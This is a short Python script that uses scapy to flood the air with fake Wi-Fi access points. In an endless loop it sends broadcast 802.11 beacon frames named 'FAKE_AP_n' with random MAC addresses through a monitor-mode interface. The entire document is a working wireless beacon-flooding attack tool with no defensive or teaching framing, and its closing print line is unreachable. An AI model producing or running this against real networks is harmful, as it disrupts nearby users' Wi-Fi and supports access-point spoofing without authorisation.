import random as rand
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp  # type: ignore

IFACE = "wlan0mon"
count = 0

while True:
    # step 1: Create the packets
    count += 1
    ssid = f"FAKE_AP_{count}"
    mac = f"02:00:00:{rand.randint(0, 255):02x}:{rand.randint(0, 255):02x}:{rand.randint(0, 255):02x}"  # type: ignore

    pkt = (
        RadioTap()
        / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
        / Dot11Beacon(cap="ESS")
        / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    )

    # step 2: Send the packets !
    sendp(pkt, iface=IFACE, count=1, verbose=False)

print(f"[*] Fake access points created and broadcasted.")
